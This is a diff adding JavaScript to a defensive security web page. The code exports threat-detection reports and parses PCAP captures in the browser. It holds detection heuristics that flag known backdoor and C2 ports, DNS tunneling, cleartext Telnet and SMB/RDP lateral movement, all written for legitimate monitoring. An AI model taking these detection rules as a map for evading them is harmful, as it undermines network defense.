+      +(f.rule.mitre&&f.rule.mitre.length?'<div style="padding:8px 16px;font-size:10px;color:#6b7280">MITRE ATT&CK: '+f.rule.mitre.map(function(t){return '<span style="background:#eff6ff;color:#1d4ed8;padding:1px 6px;border-radius:3px;font-family:monospace">'+safe(t)+'</span>';}).join(' ')+'</div>':'')
+      +(allEv.length?'<div style="background:#1e293b;padding:8px 14px;max-height:160px;overflow-y:auto">'+allEv.slice(0,8).map(function(ev){return '<div style="font-family:monospace;font-size:10px;color:#94a3b8;padding:2px 0;border-bottom:1px solid #334155">'+safe(ev.line)+'</div>';}).join('')+'</div>':'')
+      +'</div>';
+  }).join('');
+
+  var html = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">'
+    +'<title>Log Analysis Report — Ghost Defense</title>'
+    +'<style>body{font-family:Calibri,Arial,sans-serif;margin:0;background:#f3f4f6;color:#111}'
+    +'@media print{body{background:#fff}.no-print{display:none}}</style></head><body>'
+    +'<div style="background:#0f172a;padding:20px 40px;display:flex;justify-content:space-between;align-items:center">'
+      +'<div><div style="font-size:20px;font-weight:bold;color:#00ff41;letter-spacing:3px">GHOST DEFENSE</div>'
+        +'<div style="color:#9ca3af;font-size:12px;letter-spacing:2px;margin-top:2px">LOG ANALYSIS — THREAT DETECTION REPORT</div></div>'
+      +'<div style="text-align:right;color:#9ca3af;font-size:11px">'+safe(timeStr)+'<br>DEFEND ALWAYS 🛡️</div>'
+    +'</div>'
+    +'<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:10px;padding:16px 40px">'
+    +[[critCount,'Critical',critCount>0?'#dc2626':'#6b7280'],[highCount,'High',highCount>0?'#ea580c':'#6b7280'],
+      [medCount,'Medium',medCount>0?'#ca8a04':'#6b7280'],[totalHits,'Events Matched','#374151'],
+      [r.lineCount.toLocaleString(),'Lines Analyzed','#2563eb']].map(function(s){
+      return '<div style="background:#fff;border:1px solid #e5e7eb;border-radius:6px;padding:12px;text-align:center">'
+        +'<div style="font-size:22px;font-weight:700;color:'+s[2]+'">'+s[0]+'</div>'
+        +'<div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:1px;margin-top:3px">'+s[1]+'</div></div>';
+    }).join('')+'</div>'
+    +'<div style="background:#fff;margin:0 40px 14px;border-radius:8px;padding:13px 18px;border:1px solid #e5e7eb;font-size:12px">'
+      +'<strong>Analysis date:</strong> '+safe(dateStr)+' &nbsp;·&nbsp; '
+      +'<strong>Log lines:</strong> '+r.lineCount.toLocaleString()+' &nbsp;·&nbsp; '
+      +'<strong>Rules applied:</strong> '+RULES.length+' &nbsp;·&nbsp; '
+      +'<strong>Risk score:</strong> <span style="color:'+(riskScore>=60?'#dc2626':riskScore>=30?'#ea580c':'#16a34a')+';font-weight:600">'+riskScore+'/100</span> &nbsp;·&nbsp; '
+      +'<strong>Processing:</strong> Local (logs never transmitted)'
+    +'</div>'
+    +'<div style="margin:0 40px 20px">'+findingRows+'</div>'
+    +'<div style="background:#0f172a;padding:12px 40px;display:flex;justify-content:space-between;color:#9ca3af;font-size:11px" class="no-print">'
+      +'<span>Ghost Defense · Log Analyzer · Local Processing · DEFEND ALWAYS</span>'
+    +'</div></body></html>';
+
+  var blob = new Blob([html],{type:'text/html'});
+  var a = document.createElement('a'); a.href=URL.createObjectURL(blob);
+  a.download='log-analysis-'+now.toISOString().split('T')[0]+'.html'; a.click();
+}
+
+// ── EXPORT PDF ────────────────────────────────────────────────────────────────
+function exportPDF() {
+  if (!analysisResults) return;
+  var r = analysisResults;
+  var now = new Date();
+  var dateStr = now.toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
+  var timeStr = now.toUTCString();
+  function safe(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+  var critCount = r.findings.filter(function(f){return f.rule.severity==='critical';}).length;
+  var highCount  = r.findings.filter(function(f){return f.rule.severity==='high';}).length;
+  var medCount   = r.findings.filter(function(f){return f.rule.severity==='medium';}).length;
+  var totalHits  = r.findings.reduce(function(s,f){return s+f.hits.reduce(function(a,h){return a+(h.evidence||[]).length;},0);},0);
+  var riskScore  = Math.min(critCount*25+highCount*12+medCount*5,100);
+  var riskColor  = riskScore>=60?'#dc2626':riskScore>=30?'#ea580c':'#16a34a';
+  var riskLabel  = riskScore>=60?'CRITICAL THREAT ACTIVITY':riskScore>=30?'SUSPICIOUS ACTIVITY':'LOW / CLEAN';
+
+  function pdfDonut(pct,color){
+    var r2=36;var circ=2*Math.PI*r2;var dash=pct/100*circ;var gap=circ-dash;var offset=circ*0.25;
+    return '<svg width="100" height="100" viewBox="0 0 100 100">'
+      +'<circle cx="50" cy="50" r="'+r2+'" fill="none" stroke="#e5e7eb" stroke-width="14"/>'
+      +'<circle cx="50" cy="50" r="'+r2+'" fill="none" stroke="'+color+'" stroke-width="14"'
+        +' stroke-dasharray="'+dash.toFixed(1)+' '+gap.toFixed(1)+'" stroke-dashoffset="'+offset.toFixed(1)+'"/>'
+      +'<text x="50" y="45" text-anchor="middle" font-family="Arial" font-size="14" font-weight="bold" fill="'+color+'">'+pct+'</text>'
+      +'<text x="50" y="60" text-anchor="middle" font-family="Arial" font-size="9" fill="#6b7280">/100</text>'
+      +'</svg>';
+  }
+
+  var sevColors = {critical:'#dc2626',high:'#ea580c',medium:'#ca8a04',low:'#2563eb'};
+  var tableRows = r.findings.map(function(f,i){
+    var allEv=[]; f.hits.forEach(function(h){if(h.evidence)allEv=allEv.concat(h.evidence);});
+    var sc = sevColors[f.rule.severity]||'#6b7280';
+    var details = f.hits.map(function(h){return h.detail||'';}).filter(Boolean);
+    return '<tr style="background:'+(i%2===0?'#f9fafb':'#fff')+'">'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb"><span style="background:'+sc+'22;color:'+sc+';font-size:9px;font-weight:700;padding:1px 6px;border-radius:3px;border:1px solid '+sc+'55">'+f.rule.severity.toUpperCase()+'</span></td>'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb;font-size:11px;font-weight:600">'+safe(f.rule.title)+'</td>'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb;font-size:10px;color:#6b7280">'+safe(f.rule.category)+'</td>'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb;font-size:10px;font-family:monospace">'+(f.rule.mitre||[]).slice(0,2).join(', ')+'</td>'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb;text-align:center;font-weight:600;color:'+sc+'">'+allEv.length+'</td>'
+      +'<td style="padding:6px 8px;border-bottom:1px solid #e5e7eb;font-size:10px;color:#374151">'+safe((details[0]||'').substring(0,80))+'</td>'
+      +'</tr>';
+  }).join('');
+
+  var evidencePages = r.findings.filter(function(f){return f.rule.severity==='critical'||f.rule.severity==='high';}).map(function(f){
+    var allEv=[]; f.hits.forEach(function(h){if(h.evidence)allEv=allEv.concat(h.evidence);});
+    var sc = sevColors[f.rule.severity]||'#6b7280';
+    return '<div style="margin-bottom:14px">'
+      +'<div style="background:'+sc+';color:#fff;padding:7px 12px;border-radius:5px 5px 0 0;font-size:11px;font-weight:700">'+safe(f.rule.title)+' — '+allEv.length+' event(s)</div>'
+      +'<div style="border:1px solid #e5e7eb;border-top:none;border-radius:0 0 5px 5px;overflow:hidden">'
+        +allEv.slice(0,8).map(function(ev,i){return '<div style="font-family:monospace;font-size:9px;padding:4px 10px;border-bottom:1px solid #f1f5f9;background:'+(i%2===0?'#fff':'#f9fafb')+';word-break:break-all;line-height:1.5"><span style="color:#94a3b8;margin-right:8px">'+(ev.idx+1)+'</span>'+safe(ev.line)+'</div>';}).join('')
+        +(allEv.length>8?'<div style="padding:5px 10px;font-size:10px;color:#6b7280">… '+(allEv.length-8)+' more events</div>':'')
+      +'</div></div>';
+  }).join('');
+
+  var pdfDoc = '<!DOCTYPE html><html><head><meta charset="UTF-8">'
+    +'<style>body{font-family:Arial,sans-serif;margin:0;background:#fff;color:#111;font-size:12px}'
+    +'@page{size:A4;margin:14mm}@media print{.pb{page-break-before:always}}'
+    +'.cover{min-height:100vh;background:linear-gradient(135deg,#0f172a,#1c1230);color:#fff;'
+      +'display:flex;flex-direction:column;align-items:center;justify-content:center;'
+      +'padding:60px 40px;text-align:center;page-break-after:always}'
+    +'.sh{background:#1e293b;color:#fff;padding:8px 14px;border-radius:5px;font-size:12px;font-weight:700;margin:14px 0 10px}'
+    +'.pdf-table{width:100%;border-collapse:collapse}'
+    +'.pdf-table th{background:#1e293b;color:#fff;padding:7px 8px;text-align:left;font-size:9px;text-transform:uppercase;letter-spacing:.5px}'
+    +'.pdf-table td{padding:6px 8px;border-bottom:1px solid #f1f5f9;vertical-align:top}'
+    +'</style></head><body>'
+    +'<div class="cover">'
+      +'<div style="font-size:11px;letter-spacing:3px;color:#94a3b8;border:1px solid #475569;padding:4px 14px;border-radius:4px;margin-bottom:32px">TLP:CLEAR · LOCAL PROCESSING</div>'
+      +'<div style="font-size:13px;letter-spacing:4px;color:#ffd166;font-weight:700;margin-bottom:16px">🔍 LOG ANALYSIS</div>'
+      +'<div style="font-size:38px;font-weight:700;line-height:1.15;margin-bottom:10px">Threat Detection Report</div>'
+      +'<div style="font-size:14px;color:#94a3b8;margin-bottom:32px">Brute Force · Lateral Movement · Privilege Escalation · Web Attacks</div>'
+      +'<div style="display:flex;align-items:center;gap:20px;margin-bottom:32px">'
+        +pdfDonut(riskScore,riskColor)
+        +'<div style="text-align:left">'
+          +'<div style="font-size:18px;font-weight:700;color:'+riskColor+'">'+riskLabel+'</div>'
+          +'<div style="font-size:13px;color:#94a3b8;margin-top:4px">'+r.findings.length+' rules triggered</div>'
+          +'<div style="font-size:13px;color:#94a3b8">'+totalHits+' events matched</div>'
+          +'<div style="font-size:13px;color:#94a3b8">'+r.lineCount.toLocaleString()+' lines analyzed</div>'
+        +'</div>'
+      +'</div>'
+      +'<div style="background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:18px 28px;width:100%;max-width:360px;margin-bottom:32px">'
+        +[['Date',safe(dateStr)],['Critical',critCount],['High',highCount],['Medium',medCount],['Risk Score',riskScore+' / 100'],['Log Lines',r.lineCount.toLocaleString()]].map(function(row){
+          return '<div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.08);font-size:11px;color:#cbd5e1"><span>'+row[0]+'</span><span style="color:#fff;font-weight:500">'+row[1]+'</span></div>';
+        }).join('')
+      +'</div>'
+      +'<div style="font-size:10px;color:#64748b">Ghost Defense · All log processing is local · DEFEND ALWAYS</div>'
+    +'</div>'
+    +'<div class="pb">'
+    +'<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:14px">'
+    +[[critCount,'Critical',critCount>0?'#dc2626':'#6b7280',critCount>0?'#fef2f2':'#f9fafb',critCount>0?'#fca5a5':'#e5e7eb'],
+      [highCount,'High',highCount>0?'#ea580c':'#6b7280',highCount>0?'#fff7ed':'#f9fafb',highCount>0?'#fdba74':'#e5e7eb'],
+      [medCount,'Medium',medCount>0?'#ca8a04':'#6b7280',medCount>0?'#fefce8':'#f9fafb',medCount>0?'#fde047':'#e5e7eb'],
+      [totalHits,'Events Matched','#374151','#f9fafb','#e5e7eb'],
+      [r.lineCount.toLocaleString(),'Lines Analyzed','#2563eb','#eff6ff','#bfdbfe']].map(function(s){
+      return '<div style="background:'+s[3]+';border:1px solid '+s[4]+';border-radius:6px;padding:11px;text-align:center"><div style="font-size:20px;font-weight:700;color:'+s[2]+'">'+s[0]+'</div><div style="font-size:9px;text-transform:uppercase;letter-spacing:1px;color:#6b7280;margin-top:2px">'+s[1]+'</div></div>';
+    }).join('')
+    +'</div>'
+    +'<div class="sh">Findings Summary</div>'
+    +'<table class="pdf-table"><thead><tr>'
+      +'<th>Severity</th><th>Finding</th><th>Category</th><th>MITRE ATT&CK</th><th>Events</th><th>Key Detail</th>'
+    +'</tr></thead><tbody>'+tableRows+'</tbody></table>'
+    +'</div>'
+    +(evidencePages ? '<div class="pb"><div class="sh">Evidence — Critical & High Findings</div>'+evidencePages+'</div>' : '')
+    +'</body></html>';
+
+  var win = window.open('','_blank','width=1000,height=750');
+  if (!win){ alert('Popup blocked — allow popups and retry.'); return; }
+  win.document.write(pdfDoc); win.document.close(); win.focus();
+  setTimeout(function(){ win.print(); }, 900);
+}
+
+// ── TOOL 24: PCAP PARSER ──────────────────────────────────────────────────────
+// Pure browser-side binary PCAP parser — no server, no library needed.
+// Supports pcap (magic 0xa1b2c3d4) and pcapng (magic 0x0a0d0d0a)
+
+function handlePcapFile(file) {
+  if (!file) return;
+  var ext = file.name.split('.').pop().toLowerCase();
+  if (!['pcap','pcapng','cap'].includes(ext)) {
+    document.getElementById('pcapResults').innerHTML =
+      '<div style="color:var(--red);font-family:var(--mono);font-size:12px">✗ Unsupported file type. Please upload .pcap, .pcapng, or .cap</div>';
+    return;
+  }
+  document.getElementById('pcapResults').innerHTML =
+    '<div style="color:var(--muted2);font-family:var(--mono);font-size:12px">⟳ Parsing ' + esc(file.name) + ' (' + (file.size/1024).toFixed(1) + ' KB)…</div>';
+
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    try {
+      var buf = e.target.result;
+      var view = new DataView(buf);
+      var magic = view.getUint32(0, false); // big-endian
+      var magicLE = view.getUint32(0, true); // little-endian
+
+      if (magicLE === 0xa1b2c3d4 || magicLE === 0xa1b23c4d || magic === 0xa1b2c3d4) {
+        parsePcap(buf, view, file.name);
+      } else if (magicLE === 0x0a0d0d0a || magic === 0x0a0d0d0a) {
+        parsePcapNG(buf, view, file.name);
+      } else {
+        document.getElementById('pcapResults').innerHTML =
+          '<div style="color:var(--red);font-family:var(--mono);font-size:12px">✗ Not a valid PCAP file (magic: 0x' + magicLE.toString(16) + ')</div>';
+      }
+    } catch(err) {
+      document.getElementById('pcapResults').innerHTML =
+        '<div style="color:var(--red);font-family:var(--mono);font-size:12px">✗ Parse error: ' + esc(err.message) + '</div>';
+    }
+  };
+  reader.readAsArrayBuffer(file);
+}
+
+function parsePcap(buf, view, fname) {
+  var le = (view.getUint32(0, true) === 0xa1b2c3d4 || view.getUint32(0, true) === 0xa1b23c4d);
+  var linkType = view.getUint32(20, le);
+  var packets = [];
+  var offset = 24; // global header is 24 bytes
+
+  while (offset + 16 < buf.byteLength) {
+    var tsSec  = view.getUint32(offset,     le);
+    var tsUsec = view.getUint32(offset + 4, le);
+    var capLen = view.getUint32(offset + 8, le);
+    var origLen= view.getUint32(offset + 12, le);
+    offset += 16;
+    if (capLen > buf.byteLength - offset) break;
+    var pktBuf = buf.slice(offset, offset + capLen);
+    packets.push({ tsSec, tsUsec, capLen, origLen, buf: pktBuf });
+    offset += capLen;
+    if (packets.length > 50000) break; // safety cap
+  }
+  analyzePcapPackets(packets, linkType, fname);
+}
+
+function parsePcapNG(buf, view, fname) {
+  // Parse pcapng — Section Header Block + Interface Desc + Packet blocks
+  var packets = [];
+  var linkType = 1; // assume ethernet
+  var offset = 0;
+
+  while (offset + 12 < buf.byteLength) {
+    var blockType = view.getUint32(offset, true);
+    var blockLen  = view.getUint32(offset + 4, true);
+    if (blockLen < 12 || blockLen > buf.byteLength - offset) break;
+
+    if (blockType === 0x00000001) { // Interface Desc
+      linkType = view.getUint16(offset + 8, true);
+    } else if (blockType === 0x00000006 || blockType === 0x00000003) {
+      // Enhanced Packet Block (6) or Obsolete Packet Block (3)
+      var pktOffset = blockType === 6 ? offset + 20 : offset + 20;
+      var capLen    = view.getUint32(offset + 20, true);
+      var origLen   = view.getUint32(offset + 24, true);
+      var dataStart = offset + 28;
+      if (dataStart + capLen <= buf.byteLength) {
+        packets.push({ tsSec: 0, capLen, origLen, buf: buf.slice(dataStart, dataStart + capLen) });
+      }
+    }
+    offset += blockLen;
+    if (packets.length > 50000) break;
+  }
+  analyzePcapPackets(packets, linkType, fname);
+}
+
+function analyzePcapPackets(packets, linkType, fname) {
+  var flows    = {};
+  var ips      = {};
+  var ports    = {};
+  var protos   = {};
+  var dnsQ     = [];
+  var httpReqs = [];
+  var alerts   = [];
+  var totalBytes = 0;
+
+  packets.forEach(function(pkt) {
+    totalBytes += pkt.origLen || pkt.capLen;
+    var view = new DataView(pkt.buf);
+    var offset = 0;
+
+    // Ethernet (linkType 1)
+    if (linkType === 1 && pkt.buf.byteLength >= 14) {
+      var etherType = view.getUint16(12, false);
+      offset = 14;
+
+      // VLAN tag
+      if (etherType === 0x8100 && pkt.buf.byteLength >= 18) {
+        etherType = view.getUint16(16, false);
+        offset = 18;
+      }
+
+      if (etherType === 0x0800 && pkt.buf.byteLength > offset + 20) {
+        // IPv4
+        var ihl     = (view.getUint8(offset) & 0x0f) * 4;
+        var proto   = view.getUint8(offset + 9);
+        var srcIP   = readIPv4(view, offset + 12);
+        var dstIP   = readIPv4(view, offset + 16);
+        var ipLen   = view.getUint16(offset + 2, false);
+        offset += ihl;
+
+        ips[srcIP] = (ips[srcIP]||0) + 1;
+        ips[dstIP] = (ips[dstIP]||0) + 1;
+
+        var protoName = {6:'TCP',17:'UDP',1:'ICMP',47:'GRE',50:'ESP',51:'AH'}[proto] || 'Other('+proto+')';
+        protos[protoName] = (protos[protoName]||0) + 1;
+
+        if ((proto === 6 || proto === 17) && pkt.buf.byteLength > offset + 4) {
+          var srcPort = view.getUint16(offset, false);
+          var dstPort = view.getUint16(offset + 2, false);
+          ports[dstPort] = (ports[dstPort]||0) + 1;
+
+          var flowKey = srcIP+':'+srcPort+'→'+dstIP+':'+dstPort+'/'+protoName;
+          if (!flows[flowKey]) flows[flowKey] = { srcIP, srcPort, dstIP, dstPort, proto:protoName, pkts:0, bytes:0 };
+          flows[flowKey].pkts++;
+          flows[flowKey].bytes += ipLen;
+
+          // Service detection
+          var svcPort = Math.min(srcPort, dstPort);
+          var svc = {80:'HTTP',443:'HTTPS/TLS',22:'SSH',21:'FTP',25:'SMTP',
+            53:'DNS',110:'POP3',143:'IMAP',3306:'MySQL',5432:'Postgres',
+            6379:'Redis',27017:'MongoDB',8080:'HTTP-Alt',3389:'RDP',
+            445:'SMB',139:'NetBIOS',23:'Telnet',1433:'MSSQL'}[svcPort];
+          if (flows[flowKey]) flows[flowKey].service = svc || '';
+
+          // DNS parse
+          if ((srcPort===53||dstPort===53) && proto===17 && pkt.buf.byteLength > offset+12) {
+            var dnsOff = offset + 8;
+            var qCount = view.getUint16(dnsOff + 4, false);
+            if (qCount > 0 && qCount < 10) {
+              var name = parseDNSName(view, dnsOff + 12, pkt.buf.byteLength);
+              if (name && name.length > 1) dnsQ.push({ name, src:srcIP, dst:dstIP });
+            }
+          }
+
+          // HTTP parse (basic)
+          if ((dstPort===80||dstPort===8080) && proto===6 && pkt.buf.byteLength > offset+20) {
+            try {
+              var tcpHdrLen = ((view.getUint8(offset+12)>>4)&0xf)*4;
+              var payloadOff = offset + tcpHdrLen;
+              if (pkt.buf.byteLength > payloadOff + 4) {
+                var payload = readASCII(pkt.buf, payloadOff, Math.min(200, pkt.buf.byteLength - payloadOff));
+                var httpMatch = payload.match(/^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)/);
+                if (httpMatch) httpReqs.push({ method:httpMatch[1], path:httpMatch[2], src:srcIP, dst:dstIP+':'+dstPort });
+              }
+            } catch(e) {}
+          }
+
+          // Alert: suspicious ports
+          var suspPorts = [4444,1337,31337,6666,6667,6668,8888,9999,12345,54321,8443];
+          if (suspPorts.includes(dstPort) || suspPorts.includes(srcPort)) {
+            alerts.push({ sev:'HIGH', msg:'Suspicious port: '+srcIP+':'+srcPort+' → '+dstIP+':'+dstPort+' ('+protoName+')', rule:'Potential C2/backdoor port' });
+          }
+          // Alert: telnet
+          if (dstPort===23||srcPort===23) {
+            alerts.push({ sev:'MEDIUM', msg:'Cleartext Telnet: '+srcIP+' → '+dstIP, rule:'Insecure protocol — credentials exposed' });
+          }
+          // Alert: high-frequency single destination (port scan indicator)
+          if (flows[flowKey] && flows[flowKey].pkts === 10) {
+            alerts.push({ sev:'MEDIUM', msg:'High-frequency flow: '+srcIP+' → '+dstIP+':'+dstPort+' ('+protoName+')', rule:'Possible port scan or C2 beacon' });
+          }
+          // Alert: DNS to non-standard port
+          if (proto===17 && dstPort===53 && !['8.8.8.8','8.8.4.4','1.1.1.1','9.9.9.9'].includes(dstIP)) {
+            alerts.push({ sev:'LOW', msg:'DNS to non-standard resolver: '+dstIP, rule:'Possible DNS tunneling or rogue resolver' });
+          }
+          // Alert: SMB/RDP
+          if ([445,139,3389].includes(dstPort)) {
+            alerts.push({ sev:'LOW', msg:'Lateral movement protocol: '+srcIP+' → '+dstIP+':'+dstPort, rule:'SMB/RDP — verify authorization' });
+          }
+        }
+      }
+    }
+  });
+
+  // Deduplicate alerts
+  var seen = {};
+  alerts = alerts.filter(function(a) {
+    var k = a.msg; if (seen[k]) return false; seen[k]=true; return true;
+  }).slice(0, 30);
+
+  renderPcapResults(fname, packets.length, totalBytes, flows, ips, ports, protos, dnsQ, httpReqs, alerts);
+}
+
+function parseDNSName(view, offset, maxLen) {
+  var labels = []; var pos = offset; var jumps = 0;
+  try {
+    while (pos < maxLen && jumps < 10) {
+      var len = view.getUint8(pos);
+      if (len === 0) break;
+      if ((len & 0xc0) === 0xc0) { jumps++; break; }
+      if (pos + 1 + len > maxLen) break;
+      var label = '';
+      for (var i = 0; i < len && i < 63; i++) label += String.fromCharCode(view.getUint8(pos+1+i));
+      labels.push(label); pos += 1 + len;
+    }
+  } catch(e) {}
+  return labels.join('.');
+}
+
+function readIPv4(view, offset) {
+  return [view.getUint8(offset),view.getUint8(offset+1),view.getUint8(offset+2),view.getUint8(offset+3)].join('.');
+}
+
+function readASCII(buf, offset, len) {
+  var arr = new Uint8Array(buf, offset, len);
+  var s = '';
+  for (var i = 0; i < arr.length; i++) {
+    var b = arr[i];
+    s += (b >= 32 && b < 127) ? String.fromCharCode(b) : '.';
+  }
+  return s;
+}
+
+function renderPcapResults(fname, pktCount, totalBytes, flows, ips, ports, protos, dnsQ, httpReqs, alerts) {
+  var flowArr = Object.values(flows).sort(function(a,b){return b.pkts-a.pkts;}).slice(0,50);
+  var topIPs  = Object.keys(ips).sort(function(a,b){return ips[b]-ips[a];}).slice(0,10);
+  var topPorts= Object.keys(ports).sort(function(a,b){return ports[b]-ports[a];}).slice(0,10);
+
+  var html = '<div style="margin-bottom:16px">'
+    + '<div style="font-size:12px;font-weight:600;color:var(--yellow);margin-bottom:10px">📦 ' + esc(fname) + ' — Parse Complete</div>'
+    // Summary stats
+    + '<div class="pcap-summary">'
+    + pcapStat(pktCount.toLocaleString(), 'Packets',  'var(--yellow)')
+    + pcapStat(flowArr.length, 'Flows', 'var(--blue)')
+    + pcapStat(Object.keys(ips).length, 'Unique IPs', 'var(--green)')
+    + pcapStat(dnsQ.length,   'DNS Queries', 'var(--purple)')
+    + pcapStat(httpReqs.length,'HTTP Reqs', 'var(--orange)')
+    + pcapStat(alerts.length,  'Alerts',    alerts.length>0?'var(--red)':'var(--green)')
+    + pcapStat((totalBytes/1024).toFixed(1)+' KB','Total Bytes','var(--muted2)')
+    + pcapStat(Object.keys(protos).map(function(p){return p+':'+protos[p];}).join(' '),'Protocols','var(--text)')
+    + '</div></div>';
+
+  // Alerts
+  if (alerts.length) {
+    html += '<div style="margin-bottom:14px"><div style="font-size:11px;font-weight:700;color:var(--red);font-family:var(--mono);margin-bottom:7px">🚨 DETECTION ALERTS ('+alerts.length+')</div>';
+    html += alerts.map(function(a) {
+      var col = a.sev==='HIGH'?'var(--red)':a.sev==='MEDIUM'?'var(--orange)':'var(--yellow)';
+      return '<div style="display:flex;gap:10px;align-items:flex-start;background:var(--s2);border:1px solid '+col+';border-radius:7px;padding:9px 12px;margin-bottom:6px;font-family:var(--mono);font-size:11px">'
+        +'<span style="color:'+col+';font-weight:700;flex-shrink:0">['+a.sev+']</span>'
+        +'<div><div style="color:var(--text)">'+esc(a.msg)+'</div><div style="color:var(--muted2);font-size:10px">'+esc(a.rule)+'</div></div>'
+        +'</div>';
+    }).join('') + '</div>';
+  }
+
+  // Top flows
+  html += '<div style="margin-bottom:14px"><div style="font-size:11px;font-weight:700;color:var(--blue);font-family:var(--mono);margin-bottom:7px">🔀 TOP FLOWS ('+flowArr.length+')</div>';
+  flowArr.slice(0,20).forEach(function(f, i) {
+    var protoClass = {TCP:'proto-tcp',UDP:'proto-udp',ICMP:'proto-icmp'}[f.proto]||'proto-other';
+    var svcLabel = f.service ? '<span style="font-size:9px;color:var(--muted2);margin-left:4px">'+esc(f.service)+'</span>' : '';
+    var flowHtml = '<div class="pcap-flow">';
+    flowHtml += '<div class="pcap-flow-hdr" onclick="this.nextElementSibling.classList.toggle(\"open\")'+'">';
+    flowHtml += '<span class="pcap-proto ' + protoClass + '">' + f.proto + '</span>';
+    flowHtml += '<span style="color:var(--text);flex:1">' + esc(f.srcIP) + ':' + f.srcPort + ' → ' + esc(f.dstIP) + ':' + f.dstPort + svcLabel + '</span>';
+    flowHtml += '<span style="color:var(--muted2)">' + f.pkts + ' pkts · ' + (f.bytes/1024).toFixed(1) + ' KB</span>';
+    flowHtml += '</div><div class="pcap-flow-body">';
+    flowHtml += 'Src: ' + esc(f.srcIP) + ':' + f.srcPort + ' | Dst: ' + esc(f.dstIP) + ':' + f.dstPort;
+    flowHtml += ' | Proto: ' + f.proto + (f.service ? ' (' + f.service + ')' : '');
+    flowHtml += ' | Pkts: ' + f.pkts + ' | Bytes: ' + (f.bytes/1024).toFixed(2) + ' KB';
+    flowHtml += '</div></div>';
+    html += flowHtml;
+  });
+  html += '</div>';
+
+  // DNS queries
+  if (dnsQ.length) {
+    html += '<div style="margin-bottom:14px"><div style="font-size:11px;font-weight:700;color:var(--purple);font-family:var(--mono);margin-bottom:7px">🔍 DNS QUERIES ('+dnsQ.length+')</div>'
+      + '<div style="background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:var(--mono);font-size:11px;max-height:160px;overflow-y:auto">'
+      + dnsQ.slice(0,30).map(function(d){ return '<div style="color:var(--text);border-bottom:1px solid var(--border);padding:4px 0">'+esc(d.src)+' → <span style="color:var(--purple)">'+esc(d.name)+'</span></div>'; }).join('')
+      + '</div></div>';
+  }
+
+  // HTTP requests
+  if (httpReqs.length) {
+    html += '<div style="margin-bottom:14px"><div style="font-size:11px;font-weight:700;color:var(--orange);font-family:var(--mono);margin-bottom:7px">🌐 HTTP REQUESTS ('+httpReqs.length+')</div>'
+      + '<div style="background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:var(--mono);font-size:11px;max-height:160px;overflow-y:auto">'
+      + httpReqs.slice(0,20).map(function(r){ return '<div style="border-bottom:1px solid var(--border);padding:4px 0"><span style="color:var(--orange)">'+esc(r.method)+'</span> <span style="color:var(--text)">'+esc(r.path)+'</span> <span style="color:var(--muted2)">'+esc(r.src)+' → '+esc(r.dst)+'</span></div>'; }).join('')
+      + '</div></div>';
+  }
+
+  // Top IPs and Ports
+  html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px">'
+    + '<div><div style="font-size:11px;font-weight:700;color:var(--green);font-family:var(--mono);margin-bottom:7px">📡 TOP IPs</div>'
+    + '<div style="background:var(--s2);border:1px solid var(--border);border-radius:8px;overflow:hidden">'
+    + topIPs.map(function(ip,i){ return '<div style="display:flex;justify-content:space-between;padding:6px 12px;border-bottom:1px solid var(--border);font-family:var(--mono);font-size:11px;color:var(--text)"><span>'+esc(ip)+'</span><span style="color:var(--muted2)">'+ips[ip]+' pkts</span></div>'; }).join('')
+    + '</div></div>'
+    + '<div><div style="font-size:11px;font-weight:700;color:var(--cyan);font-family:var(--mono);margin-bottom:7px">🔌 TOP PORTS</div>'
+    + '<div style="background:var(--s2);border:1px solid var(--border);border-radius:8px;overflow:hidden">'
+    + topPorts.map(function(p){ var svc={80:'HTTP',443:'HTTPS',22:'SSH',53:'DNS',21:'FTP',25:'SMTP',3389:'RDP',445:'SMB',3306:'MySQL'}[p]||''; return '<div style="display:flex;justify-content:space-between;padding:6px 12px;border-bottom:1px solid var(--border);font-family:var(--mono);font-size:11px;color:var(--text)"><span>'+p+(svc?' <span style="color:var(--muted2);font-size:10px">'+svc+'</span>':'')+'</span><span style="color:var(--muted2)">'+ports[p]+' pkts</span></div>'; }).join('')
+    + '</div></div></div>';
+
+  document.getElementById('pcapResults').innerHTML = html;
+}
+
+function pcapStat(num, lbl, col) {
+  return '<div class="pcap-stat"><div class="pcap-stat-num" style="color:'+col+'">'+num+'</div><div class="pcap-stat-lbl">'+lbl+'</div></div>';
+}
+
+</script>
+<script>
+(function(){
+  var dz=document.getElementById('pcapDrop'); if(!dz) return;
+  ['dragenter','dragover'].forEach(function(ev){ dz.addEventListener(ev,function(e){ e.preventDefault(); dz.classList.add('drag'); }); });
+  ['dragleave','drop'].forEach(function(ev){ dz.addEventListener(ev,function(e){ e.preventDefault(); dz.classList.remove('drag'); }); });
+  dz.addEventListener('drop',function(e){ var f=e.dataTransfer&&e.dataTransfer.files&&e.dataTransfer.files[0]; if(f) handlePcapFile(f); });
+})();
+</script>
+</body>
+</html>
